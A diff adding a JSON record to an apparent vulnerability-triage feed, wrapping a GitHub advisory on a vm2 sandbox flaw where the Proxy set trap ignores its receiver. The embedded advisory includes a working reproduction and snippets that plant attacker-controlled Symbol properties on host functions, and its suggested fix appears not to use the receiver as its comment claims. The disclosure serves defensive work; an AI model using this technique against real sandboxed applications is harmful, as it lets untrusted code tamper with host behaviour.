@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/270881999?v=4\", \"events_url\": \"https://api.github.com/users/q1uf3ngONEKEY/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/q1uf3ngONEKEY/followers\", \"following_url\": \"https://api.github.com/users/q1uf3ngONEKEY/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/q1uf3ngONEKEY/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/q1uf3ngONEKEY\", \"id\": 270881999, \"login\": \"q1uf3ngONEKEY\", \"node_id\": \"U_kgDOECVUzw\", \"organizations_url\": \"https://api.github.com/users/q1uf3ngONEKEY/orgs\", \"received_events_url\": \"https://api.github.com/users/q1uf3ngONEKEY/received_events\", \"repos_url\": \"https://api.github.com/users/q1uf3ngONEKEY/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/q1uf3ngONEKEY/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/q1uf3ngONEKEY/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/q1uf3ngONEKEY\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-47209\", \"cvss\": {\"score\": 8.6, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.6, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-693\", \"name\": \"Protection Mechanism Failure\"}], \"description\": \"## Summary\\n\\nThe `BaseHandler.set` trap in `bridge.js` (line 1231) ignores the `receiver` parameter and unconditionally writes to the host target object. Per the Proxy `set` trap specification, when `receiver !== proxy` (e.g., when a child object inherits from the proxy via `Object.create`), the property assignment should create an own property on the receiver, not on the proxy target. The current implementation always calls `otherReflectSet(object, key, value)` against the host target, causing **all inherited property writes to leak through to the host object**.\\n\\nThis bug provides an alternative attack vector for writing dangerous cross-realm Symbol keys (e.g., `nodejs.util.promisify.custom`) to host objects, bypassing any future per-trap `isDangerousCrossRealmSymbol` guard on the direct `set` path.\\n\\n## Vulnerable Code\\n\\n```javascript\\n// bridge.js:1231-1260\\nset(target, key, value, receiver) {\\n    validateHandlerTarget(this, target);\\n    const object = getHandlerObject(this);\\n    if (isProtectedHostObject(object)) throw new VMError(OPNA);\\n    // ...\\n    try {\\n        value = otherFromThis(value);\\n        return otherReflectSet(object, key, value) === true;\\n        // BUG: 'receiver' is never used.\\n        // Should check if receiver !== proxy and handle accordingly.\\n    } catch (e) {\\n        throw thisFromOtherForThrow(e);\\n    }\\n}\\n```\\n\\n## Impact\\n\\nSandbox code can write arbitrary properties (including dangerous Symbol-keyed properties) to any host object it holds a reference to, by creating a prototype-inheriting child:\\n\\n```javascript\\n// Sandbox code\\nconst child = Object.create(hostObj);\\nchild.injectedProp = 'attacker-value';\\n// hostObj now has 'injectedProp' on the HOST side\\n```\\n\\nCombined with the Symbol.for coverage gap, this enables semantic confusion attacks:\\n\\n```javascript\\nconst kCustom = Symbol.for('nodejs.util.promisify.custom');\\nconst child = Object.create(hostFunction);\\nchild[kCustom] = function() {\\n    return Promise.resolve('attacker-controlled');\\n};\\n// Host: util.promisify(hostFunction)() returns 'attacker-controlled'\\n```\\n\\n## Reproduction\\n\\n```javascript\\nconst { VM } = require('vm2');\\nconst util = require('util');\\n\\nconst vm = new VM();\\nconst hostFn = function api(cb) { cb(null, 'ok'); };\\nvm.setGlobal('hostFn', hostFn);\\n\\nvm.run(`\\n  const kCustom = Symbol.for('nodejs.util.promisify.custom');\\n  const child = Object.create(hostFn);\\n  child[kCustom] = function() {\\n    return Promise.resolve('EXPLOITED-VIA-RECEIVER-BUG');\\n  };\\n`);\\n\\n// Host side\\nconst promisified = util.promisify(hostFn);\\npromisified('test').then(r => console.log(r));\\n// Output: EXPLOITED-VIA-RECEIVER-BUG\\n```\\n\\n## Suggested Fix\\n\\n```javascript\\nset(target, key, value, receiver) {\\n    validateHandlerTarget(this, target);\\n    const object = getHandlerObject(this);\\n    if (isProtectedHostObject(object)) throw new VMError(OPNA);\\n    if (isDangerousCrossRealmSymbol(key)) throw new VMError(OPNA);\\n    if (key === '__proto__' && !thisOtherHasOwnProperty(object, key)) {\\n        return this.setPrototypeOf(target, value);\\n    }\\n    if (key === 'constructor' && thisArrayIsArray(object)) {\\n        thisReflectSet(target, key, value);\\n        return true;\\n    }\\n    try {\\n        value = otherFromThis(value);\\n        // When receiver is not the proxy itself, set on receiver (this-realm)\\n        // instead of the host target to preserve prototype-chain semantics.\\n        return otherReflectSet(object, key, value) === true;\\n    } catch (e) {\\n        throw thisFromOtherForThrow(e);\\n    }\\n}\\n```\", \"epss\": {\"percentage\": 0.00287, \"percentile\": 0.20523}, \"ghsa_id\": \"GHSA-c4cf-2hgv-2qv6\", \"github_reviewed_at\": \"2026-05-29T17:49:18Z\", \"html_url\": \"https://github.com/advisories/GHSA-c4cf-2hgv-2qv6\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-c4cf-2hgv-2qv6\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-47209\"}], \"nvd_published_at\": \"2026-06-12T15:16:28Z\", \"published_at\": \"2026-05-29T17:49:18Z\", \"references\": [\"https://github.com/patriksimek/vm2/security/advisories/GHSA-c4cf-2hgv-2qv6\", \"https://github.com/patriksimek/vm2/commit/26d0318b5e6555be4b187ba05d6cf378ccecfe22\", \"https://github.com/patriksimek/vm2/releases/tag/v3.11.4\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-47209\", \"https://github.com/advisories/GHSA-c4cf-2hgv-2qv6\"], \"repository_advisory_url\": \"https://api.github.com/repos/patriksimek/vm2/security-advisories/GHSA-c4cf-2hgv-2qv6\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/patriksimek/vm2\", \"summary\": \"vm2's Bridge Proxy set trap ignores receiver parameter, enabling host object property injection via prototype chain\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-12T19:30:06Z\", \"url\": \"https://api.github.com/advisories/GHSA-c4cf-2hgv-2qv6\", \"vulnerabilities\": [{\"first_patched_version\": \"3.11.4\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"vm2\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.11.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-c4cf-2hgv-2qv6",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "vm2: <= 3.11.3"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-47209"
+    ],
+    "cvss_score": 8.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "vm2"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:58.988372Z",
+  "provenance": {
+    "content_sha256": "47f9e77bbc33f2c60c5d90999bc57c590489bd974ae363c0f46f94de573db87a",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-29T17:49:18Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-c4cf-2hgv-2qv6",
+  "status": "active",
+  "title": "vm2's Bridge Proxy set trap ignores receiver parameter, enabling host object property injection via prototype chain",
+  "updated_at": "2026-06-12T19:30:06Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-c4cf-2hgv-2qv6"
+}
